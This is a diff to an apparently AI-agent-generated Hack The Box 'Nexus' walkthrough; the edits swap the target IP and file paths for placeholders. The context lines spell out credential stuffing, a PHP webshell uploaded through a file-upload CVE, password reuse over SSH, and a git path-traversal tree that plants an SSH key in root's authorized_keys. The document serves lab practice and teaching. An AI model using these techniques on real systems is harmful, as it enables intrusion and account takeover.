@@ -1,6 +1,6 @@
 # HTB "Nexus" — Walkthrough & Penetration Testing Report
 
-**Target:** 10.129.107.236 (`nexus.htb`, `git.nexus.htb`, `billing.nexus.htb`)
+**Target:** $TARGET (`nexus.htb`, `git.nexus.htb`, `billing.nexus.htb`)
 **Difficulty:** Easy
 **OS:** Linux (Ubuntu, kernel 6.8.0-111-generic)
 **Engagement dates:** 2026-10-01
@@ -41,7 +41,7 @@ Krayin, and git path handling in the custom sync script).
 
 | # | Stage | What | Result |
 |---|-------|------|--------|
-| 1 | Recon | Full TCP (`-p-`) + targeted `-sC -sV` nmap scan of 10.129.107.236 | Only 22/tcp (OpenSSH 9.6p1) and 80/tcp (nginx 1.24.0) open; UDP top-50 clean |
+| 1 | Recon | Full TCP (`-p-`) + targeted `-sC -sV` nmap scan of $TARGET | Only 22/tcp (OpenSSH 9.6p1) and 80/tcp (nginx 1.24.0) open; UDP top-50 clean |
 | 2 | Recon | Browsed `nexus.htb` root page / `whatweb` / manual review | Static marketing site; harvested `careers@nexus.htb` and hiring-manager email `j.matthew@nexus.htb` from the Careers job-posting modal |
 | 3 | Recon | Wildcard-vhost behavior discovered (`doesnotexist123.nexus.htb` → 302 redirect), explaining why broad ffuf vhost fuzzing found nothing; real vhosts found via targeted content-clue guessing instead | Confirmed vhosts `git.nexus.htb` and `billing.nexus.htb` added to `/etc/hosts` |
 | 4 | Recon | Browsed `git.nexus.htb` (Gitea v1.26.0), found public org `admin`, public repo `admin/krayin-docker-setup` with 2 commits | Repo openly browsable with no authentication |
@@ -49,7 +49,7 @@ Krayin, and git path handling in the custom sync script).
 | 6 | Exploit | Credential-stuffed the Krayin CRM admin login (`billing.nexus.htb/admin/login`) with the leaked password against 6 candidate usernames | `j.matthew@nexus.htb` / `N27xh!!2ucY04` succeeded (302 → `/admin/dashboard`, confirmed via authenticated GET returning `<title>Dashboard</title>`) |
 | 7 | Exploit | Exploited CVE-2026-38526 — authenticated arbitrary file upload via `/admin/tinymce/upload` — uploading `shell.php` disguised with `type=image/jpeg` | Webshell stored at `http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php`; `?cmd=id` confirmed RCE as `www-data` |
 | 8 | Exploit | Used the webshell to `cat /var/www/krayin/.env` | Leaked the **live** (rotated) `DB_PASSWORD=y27xb3ha!!74GbR`, different from the historical Gitea-leaked value |
-| 9 | Exploit | Password-reuse attempt: `ssh jones@10.129.107.236` with the live DB password | Successful SSH login as `jones` — **user.txt captured** |
+| 9 | Exploit | Password-reuse attempt: `ssh jones@$TARGET` with the live DB password | Successful SSH login as `jones` — **user.txt captured** |
 | 10 | PrivEsc | Standard local-enum checklist as `jones` (sudo -l, SUID/SGID, getcap, cron) | All dead ends — no escalation path found via classic vectors |
 | 11 | PrivEsc | `systemctl list-timers --all` / `list-units` enumeration | Discovered non-cron scheduled job `gitea-template-sync.timer` → `gitea-template-sync.service`, running `/etc/gitea/template-sync.py` as root every 60s |
 | 12 | PrivEsc | Read/analyzed `template-sync.py` logic (syncs Gitea repos flagged `template:true` by flattening `git ls-tree -r HEAD` into file writes under a staging dir, with no path sanitization) | Identified a path-traversal arbitrary-file-write primitive reachable by any authenticated Gitea user |
@@ -57,7 +57,7 @@ Krayin, and git path handling in the custom sync script).
 | 14 | PrivEsc | Hand-crafted a malicious git tree with `git hash-object`/`git mktree`/`git commit-tree`: innermost blob = attacker SSH pubkey at path `root/.ssh/authorized_keys`, wrapped in 5 nested trees named `..` (staging path is 5 components deep) | Produced a commit whose `git ls-tree -r HEAD` resolves to `../../../../../root/.ssh/authorized_keys` |
 | 15 | PrivEsc | Force-pushed the crafted commit to `pwn-template`'s `main` branch over Gitea's smart-HTTP protocol | Gitea's `receive-pack` accepted it with no `git fsck` rejection of the `..` tree entry |
 | 16 | PrivEsc | Waited ≤60s for `gitea-template-sync.timer` to fire | `/var/log/template-sync.log` recorded `synced: ../../../../../root/.ssh/authorized_keys` — attacker pubkey written to root's authorized_keys as root |
-| 17 | PrivEsc | `ssh -i pwn_key root@10.129.107.236` | Root shell obtained — **root.txt captured** |
+| 17 | PrivEsc | `ssh -i pwn_key root@$TARGET` | Root shell obtained — **root.txt captured** |
 
 ---
 
@@ -103,18 +103,18 @@ reporting convention (see Section 5/Flags for capture confirmation).
 ### 4.1 Recon
 ```bash
 # Full TCP port sweep
-nmap -p- --min-rate=1000 -T4 -oN nmap/allports.txt 10.129.107.236
+nmap -p- --min-rate=1000 -T4 -oN nmap/allports.txt $TARGET
 
 # Targeted service/version scan
-nmap -sC -sV -p22,80 -oN nmap/services.txt 10.129.107.236
+nmap -sC -sV -p22,80 -oN nmap/services.txt $TARGET
 
 # UDP top-50
-nmap -sU --top-ports 50 -oN nmap/udp_top50.txt 10.129.107.236
+nmap -sU --top-ports 50 -oN nmap/udp_top50.txt $TARGET
 
 # Vhost discovery (wildcard caught most fuzzing — real vhosts found by content-clue guessing)
-curl -s -H "Host: doesnotexist123.nexus.htb" http://10.129.107.236/ -D -   # confirms wildcard -> 302 nexus.htb
+curl -s -H "Host: doesnotexist123.nexus.htb" http://$TARGET/ -D -   # confirms wildcard -> 302 nexus.htb
 
-echo "10.129.107.236 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
+echo "$TARGET nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
 ```
 
 ### 4.2 Gitea commit-history credential leak
@@ -162,7 +162,7 @@ curl -s "http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d55
 curl -s "http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php?cmd=cat+/var/www/krayin/.env"
 # -> leaks live DB_PASSWORD=y27xb3ha!!74GbR (rotated from the Gitea-leaked value)
 
-ssh jones@10.129.107.236
+ssh jones@$TARGET
 # password: y27xb3ha!!74GbR
 id
 # -> uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
@@ -205,7 +205,7 @@ COMMIT=$(git commit-tree "$CUR" -m "template sync traversal payload")
 git push -f http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/pwn-template.git "$COMMIT:refs/heads/main"
 
 # Wait <=60s for gitea-template-sync.timer, then:
-ssh -i pwn_key root@10.129.107.236
+ssh -i pwn_key root@$TARGET
 id
 # -> uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt
@@ -241,7 +241,7 @@ cat /root/root.txt
 
 ## Report Confirmation
 
-Report written to: `/home/kali/Desktop/easy/Nexus/walkthrough.md`
+Report written to: `easy/Nexus/walkthrough.md`
 
 This engagement fully compromised HTB "Nexus" (easy, Linux) end-to-end: a
 publicly exposed Gitea commit history and a staff email leaked from the
@@ -263,7 +263,7 @@ CVE research).
 FROM: @Scribe_Agent
 TO: @Orchestrator
 PHASE: Reporting -> Complete
-ACTION: Final report synthesized at /home/kali/Desktop/easy/Nexus/walkthrough.md
+ACTION: Final report synthesized at easy/Nexus/walkthrough.md
 
 MESSAGE / FINDINGS:
 Nexus (easy, Linux) is fully rooted and documented. The three-stage chain is
